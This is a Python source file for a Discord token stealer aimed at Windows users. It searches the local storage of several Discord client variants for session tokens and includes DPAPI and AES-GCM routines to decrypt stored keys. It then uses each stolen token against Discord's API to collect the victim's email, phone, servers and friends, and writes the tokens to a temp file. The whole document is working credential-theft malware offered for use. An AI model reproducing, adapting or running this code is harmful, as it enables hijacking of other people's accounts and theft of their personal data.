import os
import sys
import json
import base64
import shutil
import tempfile
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import re

class DiscordTokenStealer:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.tokens = []
        
    def get_discord_paths(self):
        paths = []
        
        discord_variants = [
            {
                "name": "Discord",
                "path": os.path.join(self.appdata, "discord"),
                "local_storage": os.path.join(self.appdata, "discord", "Local Storage", "leveldb")
            },
            {
                "name": "Discord Canary",
                "path": os.path.join(self.appdata, "discordcanary"),
                "local_storage": os.path.join(self.appdata, "discordcanary", "Local Storage", "leveldb")
            },
            {
                "name": "Discord PTB",
                "path": os.path.join(self.appdata, "discordptb"),
                "local_storage": os.path.join(self.appdata, "discordptb", "Local Storage", "leveldb")
            },
            {
                "name": "Discord Development",
                "path": os.path.join(self.appdata, "discorddevelopment"),
                "local_storage": os.path.join(self.appdata, "discorddevelopment", "Local Storage", "leveldb")
            },
            {
                "name": "Discord Lightcord",
                "path": os.path.join(self.appdata, "Lightcord"),
                "local_storage": os.path.join(self.appdata, "Lightcord", "Local Storage", "leveldb")
            }
        ]
        
        for variant in discord_variants:
            if os.path.exists(variant["path"]):
                paths.append(variant)
        
        return paths
    
    def get_discord_tokens_from_leveldb(self, leveldb_path):
        tokens = []
        
        if not os.path.exists(leveldb_path):
            return tokens
        
        try:
            for file in os.listdir(leveldb_path):
                file_path = os.path.join(leveldb_path, file)
                
                if file.endswith(".ldb") or file.endswith(".log"):
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        
                        # Find Discord tokens
                        token_patterns = [
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                            r'mfa\.[\w-]{84}',
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
                        ]
                        
                        for pattern in token_patterns:
                            matches = re.findall(pattern, content)
                            tokens.extend(matches)
                    except:
                        pass
        except:
            pass
        
        return tokens
    
    def get_discord_tokens_from_local_storage(self, localStorage_path):
        tokens = []
        
        if not os.path.exists(localStorage_path):
            return tokens
        
        try:
            for file in os.listdir(localStorage_path):
                file_path = os.path.join(localStorage_path, file)
                
                if file.endswith(".ldb") or file.endswith(".log"):
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        
                        # Find Discord tokens
                        token_patterns = [
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                            r'mfa\.[\w-]{84}',
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
                        ]
                        
                        for pattern in token_patterns:
                            matches = re.findall(pattern, content)
                            tokens.extend(matches)
                    except:
                        pass
        except:
            pass
        
        return tokens
    
    def get_encryption_key(self, discord_path):
        try:
            local_state_path = os.path.join(discord_path, "Local State")
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None
    
    def decrypt_token(self, encrypted_token, key):
        try:
            if not encrypted_token.startswith(b"v10") and not encrypted_token.startswith(b"v11"):
                return None
            
            nonce = encrypted_token[3:15]
            ciphertext = encrypted_token[15:-16]
            tag = encrypted_token[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8")
        except:
            try:
                # Try DPAPI
                decrypted = win32crypt.CryptUnprotectData(encrypted_token, None, None, None, 0)[1]
                return decrypted.decode("utf-8")
            except:
                return None
    
    def validate_token(self, token):
        try:
            # Basic token validation
            if not token or len(token) < 50:
                return False
            
            # Check if token matches Discord format
            pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
            return bool(re.match(pattern, token))
        except:
            return False
    
    def get_token_info(self, token):
        try:
            import requests
            
            headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
            
            if response.status_code == 200:
                user_data = response.json()
                return {
                    "id": user_data.get("id", ""),
                    "username": user_data.get("username", ""),
                    "discriminator": user_data.get("discriminator", ""),
                    "email": user_data.get("email", ""),
                    "phone": user_data.get("phone", ""),
                    "verified": user_data.get("verified", False),
                    "flags": user_data.get("flags", 0),
                    "premium_type": user_data.get("premium_type", 0)
                }
        except:
            pass
        
        return None
    
    def get_token_guilds(self, token):
        try:
            import requests
            
            headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
            
            if response.status_code == 200:
                guilds_data = response.json()
                guilds = []
                
                for guild in guilds_data[:20]:
                    guilds.append({
                        "id": guild.get("id", ""),
                        "name": guild.get("name", ""),
                        "owner": guild.get("owner", False)
                    })
                
                return guilds
        except:
            pass
        
        return []
    
    def get_token_friends(self, token):
        try:
            import requests
            
            headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers, timeout=5)
            
            if response.status_code == 200:
                friends_data = response.json()
                friends = []
                
                for friend in friends_data[:20]:
                    friends.append({
                        "id": friend.get("id", ""),
                        "username": friend.get("user", {}).get("username", ""),
                        "type": friend.get("type", 0)
                    })
                
                return friends
        except:
            pass
        
        return []
    
    def check_token_validity(self, token):
        try:
            import requests
            
            headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
            
            return response.status_code == 200
        except:
            return False
    
    def steal_tokens(self):
        tokens = []
        
        for discord in self.get_discord_paths():
            # Get tokens from Local Storage
            localStorage_tokens = self.get_discord_tokens_from_local_storage(discord["local_storage"])
            
            for token in localStorage_tokens:
                if self.validate_token(token):
                    token_info = {
                        "token": token,
                        "source": discord["name"],
                        "valid": False,
                        "info": None,
                        "guilds": [],
                        "friends": []
                    }
                    
                    tokens.append(token_info)
        
        return tokens
    
    def enrich_tokens(self, tokens):
        enriched_tokens = []
        
        for token_info in tokens:
            token = token_info.get("token", "")
            
            if token:
                # Check validity
                token_info["valid"] = self.check_token_validity(token)
                
                if token_info["valid"]:
                    # Get user info
                    user_info = self.get_token_info(token)
                    if user_info:
                        token_info["info"] = user_info
                    
                    # Get guilds
                    guilds = self.get_token_guilds(token)
                    if guilds:
                        token_info["guilds"] = guilds
                    
                    # Get friends
                    friends = self.get_token_friends(token)
                    if friends:
                        token_info["friends"] = friends
            
            enriched_tokens.append(token_info)
        
        return enriched_tokens
    
    def format_tokens_for_discord(self, tokens, limit=50):
        formatted = []
        
        for token_info in tokens[:limit]:
            formatted.append({
                "token": token_info.get("token", ""),
                "source": token_info.get("source", ""),
                "valid": token_info.get("valid", False),
                "username": token_info.get("info", {}).get("username", "") if token_info.get("info") else "",
                "email": token_info.get("info", {}).get("email", "") if token_info.get("info") else "",
                "premium": token_info.get("info", {}).get("premium_type", 0) if token_info.get("info") else 0
            })
        
        return formatted
    
    def export_tokens_to_file(self, tokens, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "discord_tokens.txt")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                for token_info in tokens:
                    token = token_info.get("token", "")
                    valid = "VALID" if token_info.get("valid", False) else "INVALID"
                    source = token_info.get("source", "")
                    
                    f.write(f"[{valid}] [{source}] {token}\n")
            
            return output_path
        except:
            return None
    
    def steal_all(self):
        tokens = self.steal_tokens()
        enriched_tokens = self.enrich_tokens(tokens)
        
        return {
            "total_tokens": len(enriched_tokens),
            "valid_tokens": sum(1 for t in enriched_tokens if t.get("valid", False)),
            "tokens": enriched_tokens
        }

if __name__ == "__main__":
    stealer = DiscordTokenStealer()
    data = stealer.steal_all()
    print(f"Total tokens found: {data['total_tokens']}")
    print(f"Valid tokens: {data['valid_tokens']}")
    print(json.dumps(data['tokens'][:5], indent=2, default=str))